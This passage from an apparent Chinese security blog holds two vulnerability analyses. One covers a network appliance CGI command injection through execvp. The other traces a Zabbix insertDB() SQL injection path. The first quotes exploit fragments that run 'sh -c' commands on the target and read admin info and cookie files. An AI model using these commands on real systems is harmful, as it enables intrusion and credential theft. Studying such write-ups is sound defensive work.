<p><code>dword_822F1B8</code>指向<code>&quot;Url&quot;</code>，跟进<code>sub_815E7EC()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">const char **sub_815E7EC()</div><div class="line">&#123;</div><div class="line">  const char **v2; // [sp+14h] [bp-4h]@2</div><div class="line"></div><div class="line">  while ( dword_822F1BC )</div><div class="line">  &#123;</div><div class="line">    v2 = (const char **)dword_822F1BC;</div><div class="line">    dword_822F1BC = *(_DWORD *)(dword_822F1BC + 24);</div><div class="line">    if ( !strcmp(*v2, dword_822F1B8) )</div><div class="line">      return v2;</div><div class="line">  &#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>上面函数返回后，v5不为0，进入if语句块  </p>
<p>关键点2.2，跟进<code>sub_815D063()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">调用：sub_815D063((int)v5, dest, a3, 0);</div><div class="line"></div><div class="line">signed int __cdecl sub_815D063(int a1, _BYTE *a2, int a3, int a4)</div><div class="line">&#123;</div><div class="line">	 signed int v5;</div><div class="line">	 int v7;</div><div class="line">	 _BYTE *i; // [sp+20h] [bp-8h]@1</div><div class="line">	 _BYTE *v14; // [sp+24h] [bp-4h]@1</div><div class="line">	 ......</div><div class="line">	 v12 = 0;</div><div class="line">	 v11 = 0;</div><div class="line">	 v10 = a3 - 1;</div><div class="line">	 //目标字符串空间首地址</div><div class="line">	 v14 = a2;</div><div class="line">	 //检测是否读到行尾，v7取得当前指向字符的地址值</div><div class="line">	 for ( i = *(_BYTE **)(a1 + 4); ; ++i )</div><div class="line">	 &#123;</div><div class="line">	   v7 = *i;</div><div class="line">	   if ( v7 != 13 &amp;&amp; v7 != 10 )</div><div class="line">	     break;</div><div class="line">	   if ( v7 == 13 )</div><div class="line">	     ++v9;</div><div class="line">	   else</div><div class="line">	     ++v8;</div><div class="line">	LABEL_22:</div><div class="line">	   ;</div><div class="line">	 &#125;</div><div class="line">	 ......</div><div class="line">	 if ( !v7 )</div><div class="line">	    goto LABEL_23;</div><div class="line">	 //复制每一个字符到目标字符串空间，也就是dest</div><div class="line">	 if ( v11 &lt; v10 )</div><div class="line">	 &#123;</div><div class="line">	   *v14++ = v7;</div><div class="line">	   ++v11;</div><div class="line">	   goto LABEL_22;</div><div class="line">	 &#125;</div><div class="line">	 ......</div><div class="line">	 return v5;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>函数返回后，回到关键点2，调用<code>cgiFormStringNoNewlines((int)&quot;Url&quot;, &amp;s1, 32);</code>后<code>s1</code>将指向post请求中传递的参数<code>Url</code>所对应的字符串首地址  </p>
<p>关键点2下面的if语句块，当参数Url传进的字符是<code>&quot;Command&quot;</code>时，将进入函数体内：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if ( !strcmp(&amp;s1, &quot;Command&quot;) )</div><div class="line">&#123;</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>关键点3，跟进<code>sub_8105F42()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">signed int sub_8105F42()</div><div class="line">&#123;</div><div class="line">  ......</div><div class="line">  char *argv; // [sp+30h] [bp-328h]@16</div><div class="line">  ......</div><div class="line">  char file; // [sp+2B0h] [bp-A8h]@1</div><div class="line">  char s; // [sp+2D0h] [bp-88h]@1</div><div class="line">  memset(&amp;s, 0, 0x80u);</div><div class="line">  //跟前面的分析一样，下面两个调用后，file、s分别获得参数Action、Para的字符串值的首地址字符</div><div class="line">  cgiFormStringNoNewlines((int)&quot;Action&quot;, &amp;file, 32);</div><div class="line">  cgiFormStringNoNewlines((int)&quot;Para&quot;, &amp;s, 128);</div><div class="line">  ......</div><div class="line">  pid = fork();</div><div class="line">  if ( !pid )</div><div class="line">  &#123;</div><div class="line">    close(pipedes);</div><div class="line">    dup2(fd, 1);</div><div class="line">    dup2(fd, 2);</div><div class="line">	</div><div class="line">	//接下来将字符s直到&apos;\0&apos;前整个字符串依次赋给argv所指向的字符数组</div><div class="line">    v7 = &amp;s;</div><div class="line">    v6 = &amp;s;</div><div class="line">    v5 = 0;</div><div class="line">    while ( *v6 )</div><div class="line">    &#123;</div><div class="line">      if ( *v6 == 32 )</div><div class="line">      &#123;</div><div class="line">        *v6 = 0;</div><div class="line">        (&amp;argv)[4 * v5++] = v7;</div><div class="line">        v7 = ++v6;</div><div class="line">      &#125;</div><div class="line">      else if ( !*++v6 )</div><div class="line">      &#123;</div><div class="line">        (&amp;argv)[4 * v5] = v7;</div><div class="line">        v4[v5] = 0;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    //关键点，执行系统PATH路径中，file所指向名字的程序，并传递argv指向的参数值给该程序</div><div class="line">    //该函数两个参数均由post请求提交，均可控</div><div class="line">    execvp(&amp;file, &amp;argv);</div></pre></td></tr></table></figure></p>
<p>如果file指向<code>&quot;sh -c&quot;</code>，argv指向<code>&quot;ls&quot;</code>等系统命令，那么就能达到执行任意系统命令的目的。</p>
<h2 id="三、漏洞利用分析"><a href="#三、漏洞利用分析" class="headerlink" title="三、漏洞利用分析"></a>三、漏洞利用分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">.....</div><div class="line">def touch(self,resp=None):</div><div class="line">    out = []</div><div class="line">    if not resp:</div><div class="line">        resp = self.head(self.target_url)</div><div class="line">    if &apos;etag&apos; in resp.headers:</div><div class="line">        etag,date = self._parse_etag(resp.headers[&apos;etag&apos;])</div><div class="line">        ##</div><div class="line"></div><div class="line">        out.append(&quot;Etag - %s; Last modified - %s&quot; % (etag,date))</div><div class="line">    self.timeout = None</div><div class="line">    return out</div></pre></td></tr></table></figure>
<p>获取<code>etag</code>标识和修改时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">def probe(self):</div><div class="line">    temp = randstr(7)</div><div class="line">    ##</div><div class="line"></div><div class="line">    self.log.info(&quot;Scheduling cleanup in 60 seconds...&quot;)</div><div class="line">    self._run_cmd(&quot;( sleep 60 &amp;&amp; rm -f /www/htdocs/site/pages/.%s )&quot; % temp)</div><div class="line"></div><div class="line">    self.log.info(&quot;Probing system and retrieving target info...&quot;)</div><div class="line">    ##</div><div class="line"></div><div class="line">    self._run_cmd(&quot;( cat /e*/is* &amp;&amp; uname -a &amp;&amp; /t*/b*/cfgt* system admininfo showonline &amp;&amp; cat /*/*coo*/* )&gt;/www/htdocs/site/pages/.%s&quot;% temp)</div><div class="line">    res = self.get(&quot;/site/pages/.%s&quot; % temp)</div><div class="line">    self.log.info(&quot;System information retrieved:\n&quot;+res.content)</div><div class="line"></div><div class="line">    self.log.info(&quot;Forcing removal of temp file from target now...&quot;)</div><div class="line">    self._run_cmd(&quot;killall sleep &amp;&amp; rm -f /www/htdocs/site/pages/.%s&quot; % temp)</div><div class="line">    if res.content.find(&quot;i686&quot;) == -1:</div><div class="line">        return &quot;System does not appear to be x86. Probably not exploitable.&quot;</div><div class="line">    if res.content.find(&quot;tospass&quot;) != -1 or res.content.find(&quot;superman&quot;) != -1:</div><div class="line">        self.log.warning(&quot;User may be logged in. PLEASE REVIEW SYSTEM INFO&quot;)</div></pre></td></tr></table></figure></p>
<p>探测目标是否可以利用，如果不是x86体系结构也不能利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">def _run_cmd(self,cmd,content=None,**kwargs):</div><div class="line">    params = &#123;</div><div class="line">                &quot;Url&quot;:&quot;Command&quot;,</div><div class="line">                &quot;Action&quot;:&quot;sh&quot;,</div><div class="line">                &quot;Para&quot;:&quot;sh -c &quot;+cmd.replace(&quot; &quot;,&quot;\t&quot;)</div><div class="line">    &#125;</div><div class="line">    if content:</div><div class="line">        c = StringIO(content)</div><div class="line">        kwargs[&apos;data&apos;],kwargs[&apos;files&apos;] = params,&#123;randstr(5):c&#125;</div><div class="line">        //post提交</div><div class="line">        return self.post(self.exploit_url,**kwargs)</div><div class="line">    else:</div><div class="line">        kwargs[&apos;params&apos;] = params</div><div class="line">        return self.get(self.exploit_url,**kwargs)</div></pre></td></tr></table></figure></p>
<p>Exp的主要逻辑，通过构造post请求，提交前面提到的Url、Action、Para等主要参数  </p>
<p>通过向<code>sh</code>程序传递shell指令，达到任意命令执行   </p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Zabbix insertDB()注入漏洞分析]]></title>
      <url>http://yoursite.com/2016/08/15/Zabbix_insertDB_Injection/</url>
      <content type="html"><![CDATA[<p>Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安&gt;全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。</p>
<p>由于<code>insertDB()</code>函数对可控参数过滤不当，导致SQL注入</p>
<p>攻击者可以在通过SQL注入获取数据库的访问权限。攻击者以管理员身份登陆后台后，可以实现在放置数据库的服务器执行任意系统命令</p>
<a id="more"></a>
<h1 id="Zabbix-insertDB-注入漏洞分析"><a href="#Zabbix-insertDB-注入漏洞分析" class="headerlink" title="Zabbix insertDB()注入漏洞分析"></a>Zabbix insertDB()注入漏洞分析</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h3><p>Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。</p>
<p>由于<code>insertDB()</code>函数对可控参数过滤不当，导致SQL注入。</p>
<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2. 漏洞影响"></a>2. 漏洞影响</h3><p>攻击者可以在通过SQL注入获取数据库的访问权限。攻击者以管理员身份登陆后台后，可以实现在放置数据库的服务器执行任意系统命令。  </p>
<h3 id="3-漏洞触发条件"><a href="#3-漏洞触发条件" class="headerlink" title="3. 漏洞触发条件"></a>3. 漏洞触发条件</h3><p>版本：<code>2.0.x</code>、<code>2.2.x</code>、<code>2.4.x</code>、<code>2.5</code>、<code>3.0.0-3.0.3</code><br>登陆：以下两种触发方式，都需要系统未关闭默认开启的guest账户登陆，或者拥有其他可登陆的账户。</p>
<h2 id="二、漏洞复现（以3-0-3为例）"><a href="#二、漏洞复现（以3-0-3为例）" class="headerlink" title="二、漏洞复现（以3.0.3为例）"></a>二、漏洞复现（以3.0.3为例）</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>Docker<br>ubuntu 14.04<br>zabbix <code>3.0.3</code> 源码编译安装</p>
<p><code>tar -zxvf zabbix-3.0.3.tar.gz</code>  </p>
<p><code>cd zabbix-3.0.3/database/mysql</code></p>
<p>配置数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">shell&gt; mysql -uroot -p&lt;password&gt;</div><div class="line">mysql&gt; create database zabbix character set utf8 collate utf8_bin;</div><div class="line">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &apos;zabbix&apos;;</div><div class="line">mysql&gt; quit;</div><div class="line">shell&gt; mysql -uzabbix -pzabbix zabbix &lt; schema.sql</div><div class="line"># stop here if you are creating database for Zabbix proxy</div><div class="line">shell&gt; mysql -uzabbix -p&lt;password&gt; zabbix &lt; images.sql</div><div class="line">shell&gt; mysql -uzabbix -p&lt;password&gt; zabbix &lt; data.sql</div></pre></td></tr></table></figure></p>
<p>编译：<br><code>./configure --enable-server --enable-agent --enable-java --with-unixodbc --with-mysql --with-libcurl --with-libxml2 --with-openssl --with-net-snmp --with-ldap</code></p>
<p>编译过程可能遇到如下依赖问题：  </p>
<ol>
<li><p>configure: error: MySQL library not found<br><code>apt-get install libmysqld-dev</code></p>
</li>
<li><p>configure: error: unixODBC library not found<br><code>apt-get install unixodbc-dev</code></p>
</li>
<li><p>configure: error: Curl library not found<br><code>apt-get install libcurl3-dev</code></p>
</li>
<li><p>configure: error: Unable to find “javac”executable in path<br><code>apt-get install openjdk-7-jdk</code></p>
</li>
<li><p>configure: error: Invalid Net-SNMP directory - unableto find net-snmp-config<br><code>apt-get install libsnmp-dev,snmp</code></p>
</li>
<li><p>configure: error: Invalid LDAP directory - unable tofind ldap.h<br><code>apt-getinstall libldap2-dev</code></p>
</li>
</ol>
<p>安装：<br><code>make install</code></p>
<p>修改zabbix server配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># vi /etc/zabbix/zabbix_server.conf</div><div class="line">DBHost=localhost</div><div class="line">DBName=zabbix</div><div class="line">DBUser=zabbix</div><div class="line">DBPassword=zabbix</div></pre></td></tr></table></figure></p>
<p>前端配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># vi /etc/apache2/conf-enabled/zabbix.conf</div><div class="line">php_value max_execution_time 300</div><div class="line">php_value memory_limit 128M</div><div class="line">php_value post_max_size 16M</div><div class="line">php_value upload_max_filesize 2M</div><div class="line">php_value max_input_time 300</div><div class="line">php_value always_populate_raw_post_data -1</div><div class="line">php_value date.timezone Asia/Shanghai</div></pre></td></tr></table></figure></p>
<p>安装前端：<br>在浏览器打开，http:/<ip>/zabbix按提示进行安装<br><img src="https://www.zabbix.com/documentation/3.0/_media/manual/installation/install_2.png" alt=""></ip></p>
<h3 id="2-漏洞函数分析"><a href="#2-漏洞函数分析" class="headerlink" title="2. 漏洞函数分析"></a>2. 漏洞函数分析</h3><p>该漏洞函数为<code>CProfile.php</code>中277行的<code>insertDB()</code>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertDB</span><span class="params">($idx, $value, $type, $idx2)</span> </span>&#123;</div><div class="line">	$value_type = <span class="keyword">self</span>::getFieldByType($type);</div><div class="line"></div><div class="line">	$values = [</div><div class="line">		<span class="string">'profileid'</span> =&gt; get_dbid(<span class="string">'profiles'</span>, <span class="string">'profileid'</span>),</div><div class="line">		<span class="string">'userid'</span> =&gt; <span class="keyword">self</span>::$userDetails[<span class="string">'userid'</span>],</div><div class="line">		<span class="string">'idx'</span> =&gt; zbx_dbstr($idx),</div><div class="line">		$value_type =&gt; zbx_dbstr($value),</div><div class="line">		<span class="string">'type'</span> =&gt; $type,</div><div class="line">		<span class="comment">//关键点，可控变量，未用zbx_dbstr()进行过滤</span></div><div class="line">		<span class="string">'idx2'</span> =&gt; $idx2</div><div class="line">	];</div><div class="line"></div><div class="line">	<span class="keyword">return</span> DBexecute(<span class="string">'INSERT INTO profiles ('</span>.implode(<span class="string">', '</span>, array_keys($values)).<span class="string">') VALUES ('</span>.implode(<span class="string">', '</span>, $values).<span class="string">')'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>zbx_dbstr()</code>实际上就是<code>mysql_real_escape_string()</code>，会对单引号、双引号等特殊字符做转义<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">zbx_dbstr</span><span class="params">($var)</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">switch</span> ($DB[<span class="string">'TYPE'</span>]) &#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">case</span> ZBX_DB_MYSQL:</div><div class="line">		<span class="keyword">if</span> (is_array($var)) &#123;</div><div class="line">			<span class="keyword">foreach</span> ($var <span class="keyword">as</span> $vnum =&gt; $value) &#123;</div><div class="line">				$var[$vnum] = <span class="string">"'"</span>.mysqli_real_escape_string($DB[<span class="string">'DB'</span>], $value).<span class="string">"'"</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> $var;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="string">"'"</span>.mysqli_real_escape_string($DB[<span class="string">'DB'</span>], $var).<span class="string">"'"</span>;</div></pre></td></tr></table></figure></p>
<p><code>insertDB()</code>调用<code>db.inc.php</code>中499行的<code>DBexecute()</code>也没有进行过滤，直接执行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">DBexecute</span><span class="params">($query, $skip_error_messages = <span class="number">0</span>)</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">case</span> ZBX_DB_MYSQL:</div><div class="line">	<span class="comment">//关键点，未过滤，直接执行查询函数</span></div><div class="line">	<span class="keyword">if</span> (!$result = mysqli_query($DB[<span class="string">'DB'</span>], $query)) &#123;</div><div class="line">		error(<span class="string">'Error in query ['</span>.$query.<span class="string">'] ['</span>.mysqli_error($DB[<span class="string">'DB'</span>]).<span class="string">']'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">break</span>;</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>注意<code>$idx2</code>可控，未被过滤，为第4个参数</p>
<h3 id="3-latest-php页面漏洞触发分析"><a href="#3-latest-php页面漏洞触发分析" class="headerlink" title="3. latest.php页面漏洞触发分析"></a>3. latest.php页面漏洞触发分析</h3><h4 id="3-1-漏洞代码分析"><a href="#3-1-漏洞代码分析" class="headerlink" title="3.1 漏洞代码分析"></a>3.1 漏洞代码分析</h4><p><code>latest.php</code>中，70行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (hasRequest(<span class="string">'favobj'</span>)) &#123;</div><div class="line">	<span class="keyword">if</span> ($_REQUEST[<span class="string">'favobj'</span>] == <span class="string">'toggle'</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (!is_array($_REQUEST[<span class="string">'toggle_ids'</span>])) &#123;</div><div class="line">			<span class="keyword">if</span> ($_REQUEST[<span class="string">'toggle_ids'</span>][<span class="number">1</span>] == <span class="string">'_'</span>) &#123;</div><div class="line">				$hostId = substr($_REQUEST[<span class="string">'toggle_ids'</span>], <span class="number">2</span>);</div><div class="line">				CProfile::update(<span class="string">'web.latest.toggle_other'</span>, $_REQUEST[<span class="string">'toggle_open_state'</span>], PROFILE_TYPE_INT, $hostId);</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span> &#123;</div><div class="line">				$applicationId = $_REQUEST[<span class="string">'toggle_ids'</span>];</div><div class="line">				CProfile::update(<span class="string">'web.latest.toggle'</span>, $_REQUEST[<span class="string">'toggle_open_state'</span>], PROFILE_TYPE_INT, $applicationId);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">foreach</span> ($_REQUEST[<span class="string">'toggle_ids'</span>] <span class="keyword">as</span> $toggleId) &#123;</div><div class="line">				<span class="keyword">if</span> ($toggleId[<span class="number">1</span>] == <span class="string">'_'</span>) &#123;</div><div class="line">					$hostId = substr($toggleId, <span class="number">2</span>);</div><div class="line">					CProfile::update(<span class="string">'web.latest.toggle_other'</span>, $_REQUEST[<span class="string">'toggle_open_state'</span>], PROFILE_TYPE_INT, $hostId);</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">else</span> &#123;</div><div class="line">					$applicationId = $toggleId;</div><div class="line">					CProfile::update(<span class="string">'web.latest.toggle'</span>, $_REQUEST[<span class="string">'toggle_open_state'</span>], PROFILE_TYPE_INT, $applicationId);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>提交参数<code>favobj=toggle</code>时传入的数组参数<code>toggle_ids</code>总是能进入<code>CProfile::update()</code>中的第4个参数，跟进<code>CProfile.php</code>中209行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($idx, $value, $type, $idx2 = <span class="number">0</span>)</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">if</span> (is_null($current)) &#123;</div><div class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">self</span>::$insert[$idx])) &#123;</div><div class="line">			<span class="keyword">self</span>::$insert[$idx] = [];</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">self</span>::$insert[$idx][$idx2] = $profile;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">if</span> ($current != $value) &#123;</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">self</span>::$update[$idx])) &#123;</div><div class="line">				<span class="keyword">self</span>::$update[$idx] = [];</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">self</span>::$update[$idx][$idx2] = $profile;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">self</span>::$profiles[$idx])) &#123;</div><div class="line">		<span class="keyword">self</span>::$profiles[$idx] = [];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">self</span>::$profiles[$idx][$idx2] = $value;</div><div class="line">	......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>update()</code>对一系列成员变量进行赋值更新  </p>
<p><strong>传入的<code>toggle_ids</code>成为<code>$idx2</code>这个变量，该变量可控</strong>  </p>
<p>回到<code>latest.php</code>中99行，<code>page_footer.php</code>被包含进来执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>((PAGE_TYPE_JS == $page[<span class="string">'type'</span>]) || (PAGE_TYPE_HTML_BLOCK == $page[<span class="string">'type'</span>]))&#123;</div><div class="line">	<span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/page_footer.php'</span>;</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>跟进到<code>page_footer.php</code>，38行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (CProfile::isModified()) &#123;</div><div class="line">	DBstart();</div><div class="line">	$result = CProfile::flush();</div><div class="line">	DBend($result);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟到<code>CProfile.php</code>中，<code>isModified()</code>定义：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isModified</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> (<span class="keyword">self</span>::$insert || <span class="keyword">self</span>::$update);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p><code>latest.php</code>中70行代码块调用<code>CProfile::update()</code>对<code>$insert</code><br>、<code>$update</code>等进行赋值，所以该<code>latest.php</code>会执行到上面的if语句块中  </p>
<p>if语句块中第二句调用<code>CProfile::flush()</code>，从<code>CProfile::$insert</code>中取出相应的值，并进行insertDB操作：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">flush</span><span class="params">()</span> </span>&#123;</div><div class="line">	......</div><div class="line">	<span class="keyword">foreach</span> (<span class="keyword">self</span>::$insert <span class="keyword">as</span> $idx =&gt; $profile) &#123;</div><div class="line">		<span class="keyword">foreach</span> ($profile <span class="keyword">as</span> $idx2 =&gt; $data) &#123;</div><div class="line">			$result &amp;= <span class="keyword">self</span>::insertDB($idx, $data[<span class="string">'value'</span>], $data[<span class="string">'type'</span>], $idx2);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	......</div><div class="line">	<span class="keyword">return</span> $result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最终调用了存在SQL注入的<code>insertDB()</code>，<code>$idx2</code>可控</p>
<p>总结调用流程：<br><code>latest.php: $_REQUEST[&#39;toggle_ids&#39;]   ---&gt;    CProfile::update()   ---&gt;    require_once()   ---&gt;   CProfile::flush()   ---&gt;   CProfile::insertDB()   ---&gt;   CProfile::DBexecute()</code></p>
